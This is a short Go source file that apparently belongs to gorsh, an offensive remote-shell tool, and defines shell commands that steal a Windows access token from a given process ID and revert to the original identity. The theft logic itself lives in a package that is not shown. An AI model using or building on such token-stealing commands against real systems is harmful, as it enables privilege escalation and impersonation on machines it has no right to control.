package cmds

import (
	"strconv"

	"github.com/abiosoft/ishell"
	"github.com/audibleblink/gorsh/internal/tokens"
)

func StealToken(c *ishell.Context) {
	if len(c.Args) != 1 {
		c.Println(c.Cmd.Help)
		return
	}

	pidS := c.Args[0]
	pid, err := strconv.Atoi(pidS)
	if err != nil {
		c.Println(c.Cmd.Help)
		return
	}

	tokens.StealToken(pid)
}

func RevToSelf(c *ishell.Context) {
	tokens.RevToSelf()
}
